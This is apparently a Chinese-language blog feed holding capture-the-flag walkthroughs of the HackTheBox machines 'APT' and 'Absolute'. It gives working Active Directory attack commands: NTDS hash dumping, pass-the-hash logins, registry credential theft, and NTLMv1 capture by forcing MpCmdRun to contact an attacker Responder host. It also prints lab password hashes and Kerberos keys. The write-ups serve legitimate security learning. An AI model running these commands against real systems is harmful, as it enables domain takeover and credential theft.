&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012175827.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012180900.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;根据文章所示，我们理论上来讲是可以通过 &lt;code&gt;ServerAlive2&lt;/code&gt; 来获得主机&lt;code&gt;NetBIOS, FQDN, IPv4, IPv6&lt;/code&gt;等地址的，查了下相关信息，最终是找到了这么一个脚本，下载地址: https://github.com/mubix/IOXIDResolver git到本地后得到以下利用结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012181234.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012181339.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python IOXIDResolver.py -t 10.10.10.213
Address: apt # 这是目标机器的主机名
Address: 10.10.10.213 # 这是目标机器的IPv4地址
Address: dead:beef::1b3 # 这是目标机器的IPv6地址之一
Address: dead:beef::b885:d62a:d679:573f # 这是目标机器的IPv6地址之一
Address: dead:beef::494f:8e5:1dd6:4c5 # 这是目标机器的IPv6地址之一
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为一些安全策略配置以及其他方面的原因，有时候我们扫ipv6能够获得与扫ipv4截然不同的端口号
我们简单的扫一下上面得到的ipv6的地址。这里有个坑点注意一下，以前一直是拿&lt;code&gt;windows&lt;/code&gt;主机连的vpn，虚拟机方面用NAT模式接入，以此实现对目标内网靶机的访问。但在这里的话，最好直接在虚拟机里面连，不然不知道为什么一直走不通对ipv6的访问。别的倒也没什么了，扫描结果如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013111610.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;看到了很多老朋友啊，光从53端口和3268/3269端口，我们大致就能够看出来这是一台仿DC的主机（没扫出来88端口比较遗憾）。因为开启了445端口，按照以往的习惯，先&lt;code&gt;smbclient&lt;/code&gt;裸连一下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;smbclient -N -L //htb.local
smbclient -N \\\\htb.local\\backup
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013112731.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013115320.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;裸连上后，成功把&lt;code&gt;backup.zip&lt;/code&gt;下载到了本地，本来想直接解压的，但发现有密码，得先破开才行。
这里用先用zip2john把zip转换成hash文件，之后再用john进行破译。成功得到密码：
&lt;code&gt;iloveyousomuch&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013120342.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;unzip解压之后得到了这么个玩意 &lt;code&gt;ntds.dit&lt;/code&gt;，找&lt;code&gt;gpt&lt;/code&gt;问了下这是个什么东西&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013121321.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ntds.dit 文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 %SystemRoot%\ntds\ntds.dit

ntds.dit 文件包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密

在非域环境也就是在工作组环境中，用户的密码等信息存储在 SAM 文件，想要破解 SAM 文件与 ntds.dit 文件都需要拥有一个 SYSTEM 文件。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看关键词，发现这东西存了==域中所有用户的密码哈希值==，我们这里用&lt;code&gt;secretdump&lt;/code&gt;来查一下数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;secretsdump.py -ntds ntds.dit -system ../registry/SYSTEM LOCAL &amp;gt; ../usr_hash_raw
//-system ../registry/SYSTEM: 这个参数指定了包含注册表数据的文件。`SYSTEM`文件通常包含系统配置和安全策略等信息。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;导出到usr_hash_raw之后浅读一下，发现差不多有8k条数据，用户名和密码存在一对多的关系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013123402.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;阿西吧，这一个一个试得试到猴年马月了，我们这里用域内用户枚举排除一下没用的账号，先把用户名给提取出来，去重放到本地文件里面，差不多有4k个用户等待我们来验证。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cut -d &apos;:&apos; -f1 usr_hash_raw|uniq&amp;gt;usrlist

sudo ./kerbrute_linux_amd64 userenum -d htb.local  --dc htb.local /home/f4miti0n/桌面/IOXIDResolver-master/xxx/usrlist

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013144015.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最终是爆破出了这三个有效用户&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2023/10/13 14:33:28 &amp;gt;  [+] VALID USERNAME:       APT$@htb.local
2023/10/13 14:33:28 &amp;gt;  [+] VALID USERNAME:       Administrator@htb.local
2023/10/13 14:37:51 &amp;gt;  [+] VALID USERNAME:       henry.vinson@htb.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;挨个验证还是有点麻烦，这里上点办公技巧，神奇的awk命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat usr_hash_raw|grep &quot;:::&quot;|awk -F &quot;:::&quot; &apos;{print $1}&apos;|uniq&amp;gt;userhash
//只有带:::的才是正经用户信息数据，为了后面分割数据方便，这里先把:::给去掉
awk -F &quot;:&quot; &apos;{print &quot;impacket-getTGT htb.local/henry.vinson@htb.local -hashes &quot;$3&quot;:&quot;$4}&apos; userhash|xargs -I{} bash -c {}
//理论上来讲，我们需要把那几个用户都拿来试一遍，但这里就不浪费时间了，直接上henry.vinson,查就是了
watch &quot;ls -ltr | tail -2&quot;
//监测一下有无文件生成
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013230451.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最终是拿到了&lt;code&gt;henry.vinsion&lt;/code&gt;的&lt;code&gt;TGT&lt;/code&gt;票据和&lt;code&gt;hash &lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按照常理来讲，这个时候我们就可以进行如下的尝试了，但我提前看了&lt;code&gt;Enterpr1se&lt;/code&gt;师傅的周报，机智地发现此路不通，便也不再多做尝试了，但出于学习地目的，还是记录一下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;evil-winrm -i htb.local -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb
psexec.py -hashes &apos;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&apos; htb.local/henry.vinson@htb.local
wmiexec.py -hashes &apos;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&apos; htb.local/henry.vinson@htb.local
dcomexec.py -hashes &apos;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&apos; htb.local/henry.vinson@htb.local
smbexec.py -hashes &apos;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&apos; htb.local/henry.vinson@htb.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里是用的&lt;code&gt;impacket-reg&lt;/code&gt;查的注册表来打破僵局的，我们这里查一下&lt;code&gt;HKU&lt;/code&gt;的相关键值内容，最后在&lt;code&gt;HKU\\Software\\GiganticHostingManagementSystem&lt;/code&gt;下得到了另一个用户的账户密码：&lt;code&gt;henry.vinson_adm&lt;/code&gt; / &lt;code&gt;G1#Ny5@2dvht&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg.py -hashes &apos;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&apos; -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU

reg.py -hashes &apos;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&apos; -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\Software\\GiganticHostingManagementSystem
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231013235834.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014000455.png&quot; alt=&quot;&quot; /&gt;
不知道是不是&lt;code&gt;Remote&lt;/code&gt;组的成员，我们盲登一下试试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;evil-winrm -i htb.local -u henry.vinson_adm -p G1#Ny5@2dvht  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;All Right  ,get Flag!
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014001125.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;正式进入提权阶段，老样子传了一个SharpHound.exe上去，但没发现什么有效的进攻路径，无奈转手动挡，简单收集一下当前用户信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014175005.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;然后再查看一下域内用户都有哪些 &lt;code&gt;net user /domain&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014175453.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;说实话，没什么思路，跟着红笔师傅的视频做了一下，这里是查到了&lt;code&gt;C:/users/henry.vinson_adm/appdata/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt&lt;/code&gt;这个历史敏感文件，其中涉及到的命令如下所示，相关注释也放在旁边了，别的师傅给标的，写的很清晰。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$Cred = get-credential administrator：#这个命令会弹出一个对话框，要求输入管理员的用户名和密码，然后将这些凭据存储在变量$Cred中。
 
invoke-command -credential $Cred -computername localhost -scriptblock {...}：#这个命令使用前面存储的管理员凭据在本地计算机（localhost）上执行一段脚本。
 
Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot; lmcompatibilitylevel -Type DWORD -Value 2 -Force：#这是在脚本块中执行的命令。它更改了Windows注册表中的一个设置。具体来说，它更改了&quot;lmcompatibilitylevel&quot;的值，这个值决定了系统对LAN Manager（LM）和NTLM认证的支持级别。这个命令将其设置为2，这意味着系统将使用NTLMv1和LM，但不会使用NTLMv2。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为用的是NTLMV1做验证，我们自然而然会想到用&lt;code&gt;Responder&lt;/code&gt;来做中继破解NTLM Hash。和之前的利用思路一样，我们需要让&lt;code&gt;APT&lt;/code&gt;这台靶机，访问我们本地用Responder伪造好的服务器。在之前的&lt;code&gt;Responder&lt;/code&gt;靶机中，我们用的是远程文件包含的思路，但这里显然没有这个点能来让我们利用，我们需要自己去找利用点。这里省略一些没必要说的流程，我们是在本地的&lt;code&gt;Program FIles\Windows Defender&lt;/code&gt;目录下找到的&lt;code&gt;MpCmdRun.exe&lt;/code&gt;这个利用文件，放到&lt;a href=&quot;https://lolbas-project.github.io/&quot;&gt;Mpcmdrun | LOLBAS (lolbas-project.github.io)&lt;/a&gt; 搜一搜相关用法，得到如下界面（这个网站真的好用，长期保存一下，&lt;code&gt;live off the land&lt;/code&gt;神器）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014182739.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014182915.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到&lt;code&gt;/etc/Responder/&lt;/code&gt;目录下修改&lt;code&gt;Responder.conf&lt;/code&gt;文件，将其中Random的挑战码改成&lt;code&gt;1122334455667788&lt;/code&gt;，方便&lt;code&gt;crack.sh&lt;/code&gt;进行破译&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014183720.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.\MpCmdRun.exe -Scan -scantype 3 -File \\10.10.14.6\\noexist
//在APT靶机上运行
sudo responder -I tun0 --lm
//在Kali上运行
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最终在Kali上收到了如下内容，用&lt;code&gt;ntlmv1.py&lt;/code&gt;小破一下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014184534.png&quot; alt=&quot;&quot; /&gt;
得到如下结果，把这个&lt;code&gt;NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384&lt;/code&gt;放到&lt;code&gt;crack.sh&lt;/code&gt;再进行操作
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014185407.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;得到结果&lt;code&gt;d167c3238864b12f5f82feae86a7f798&lt;/code&gt;
最后尝试用&lt;code&gt;secretdump&lt;/code&gt;导出凭据，得到Administrator的真正凭据，尝试用&lt;code&gt;evil-winrm&lt;/code&gt;链接&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;secretsdump.py &apos;htb.local/APT$@htb.local&apos; -hashes &apos;aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798&apos;
-----------------------------------------------------------------------------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014190749.png&quot; alt=&quot;&quot; /&gt;
evil-winrm链接，pwn!
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014191425.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231014191405.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>HackTheBox Absolute</title><link>https://f4miti0n.github.io/posts/absolute/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/absolute/</guid><pubDate>Mon, 09 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;打开靶机，得到IP:10.10.11.181。用nmap扫描一下，因为我其实是看着wp写的，这里就不装模做样的等着从头开始扫了。不管怎么说，最后得到的结果如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-21 16:10:37Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-21T16:11:40+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-09-21T16:11:41+00:00; +6h59m57s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-21T16:11:40+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-21T16:11:41+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-09-21T16:11:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现开了&lt;code&gt;ldap&lt;/code&gt;和&lt;code&gt;kerberos&lt;/code&gt;服务，由此判断这应该是一台仿DC的靶机。除了这两项服务以外，我们还发现这台机子是支持&lt;code&gt;http&lt;/code&gt;服务的，我们访问一下看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921172126.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921172107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;访问之后说实话，啥也看不出来，连个交互点都没有，应该是个纯静态的站，故此也就不考虑从web撕口子了。但是F12查页面源码，发现这里的&lt;code&gt;jpg&lt;/code&gt;图片名称还是挺有规律的，可以直接下载下来。相关命令如下，还是挺简单的。
&lt;code&gt;for i in {1..10};do wget http://10.10.11.181/images/hero_${i}.jpg;done;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921174121.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921174254.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;下载到本地之后，随便挑个图片查下信息，发现&lt;code&gt;Artist&lt;/code&gt;和&lt;code&gt;Author&lt;/code&gt;这两行，比较引人注意。&lt;code&gt;grep+awk&lt;/code&gt;提取一下，得到了以上人名列表。这里要根据这个人名列表推测一下可能的用户名（中国人真的很难推英文名诶），然后把可能的用户名保存到一个txt文件里，开始域内用户枚举。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921175717.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;用kerberute域内用户枚举之前，记得先把hosts文件给改一下。枚举的命令如图所示，以后直接套模板即可（sudo加不加都行），最终是得到了5个可用用户。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921180529.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921181216.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;和&lt;code&gt;Forest&lt;/code&gt;靶机的步骤差不多，到这一步我们可以用&lt;code&gt;GetNPuser.py&lt;/code&gt;。
查一查这里面的用户有没有谁把身份预验证机制给关闭了，命令如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;awk -F &quot;@&quot; &apos;{print $1}&apos; /home/f4miti0n/桌面/username.txt | xargs -I{} python3 GetNPUsers.py absolute.htb/{} -request -no-pass -dc-ip 10.10.11.181
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921195041.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921182246.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;发现&lt;code&gt;d.klay&lt;/code&gt;这个用户可以返回&lt;code&gt;TGT&lt;/code&gt;，把这个&lt;code&gt;TGT&lt;/code&gt; 保存到本地，用&lt;code&gt;john&lt;/code&gt;破解一下，得到密码&lt;code&gt;Darkmoonsky248girl&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921200312.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;拿到密码了，&lt;code&gt;ldap&lt;/code&gt;和&lt;code&gt;smb&lt;/code&gt;啥的都可以试试了，换以前的话肯定是&lt;code&gt;ldapsearch&lt;/code&gt;和&lt;code&gt;smbclient&lt;/code&gt;一顿乱连，但我先看了wp，发现原来&lt;code&gt;crackmapexec&lt;/code&gt;早把集成给做好了，直接一把梭。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921205311.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921223303.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;梭梭梭，梭不出来，确实不会用&lt;code&gt;crackmapexec&lt;/code&gt;，返回结果都没弄明白，这里是查了才知道&lt;code&gt;STATUS_ACCOUNT_RESTRICTION&lt;/code&gt; 通常意味着禁用了NTLM，并且需要使用&lt;code&gt;Kerberos&lt;/code&gt;进行身份验证。这里要想办法伪造一下TGT了，直接调整时差&lt;code&gt;impacket-getTGT&lt;/code&gt;伪造开梭&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo ntpdate -u dc.absolute.htb
impacket-getTGT &apos;absolute.htb/d.klay:Darkmoonsky248girl&apos; -dc-ip dc.absolute.htb
export KRB5CCNAME=$(pwd)/d.klay.ccache 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926171059.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;利用刚才生成的票据，配合&lt;code&gt;crackmapexec&lt;/code&gt;链接，得到以下结果。这里要吐槽一下这个&lt;code&gt;export&lt;/code&gt;导出变量儿。那个新建的变量是临时的，只在当前会话下管用。一开始把这茬忽略了，一直都是跑到&lt;code&gt;crackmapexec&lt;/code&gt;目录下新开终端跑&lt;code&gt;ldap&lt;/code&gt;，一直都连不上，就挺烦人。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926171240.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;仔细看看上图，发现&lt;code&gt;svc_smb&lt;/code&gt;这个账户别有洞天，一看就是个能连&lt;code&gt;smb&lt;/code&gt;的好账户，旁边还贴心的把密码给我们了，我们按照上面的流程重新伪造一下&lt;code&gt;TGT&lt;/code&gt;链接&lt;code&gt;smb&lt;/code&gt;试试 (&lt;code&gt;d.klay&lt;/code&gt;读不了共享就很难受)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926173809.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926174305.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926174157.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;下了&lt;code&gt;test.exe&lt;/code&gt;和&lt;code&gt;compiler.sh&lt;/code&gt;这俩文件，其实按照普通靶机来讲，我这都拿到smb权限了，让我下个flag并不过分，但这个靶机是&lt;code&gt;insane&lt;/code&gt;难度的，那也真没辙，接着分析一下test.exe (按常理讲应该是逆向分析的，但我怼着wp做，直接上wireshark)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926175637.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927084003.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927084040.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
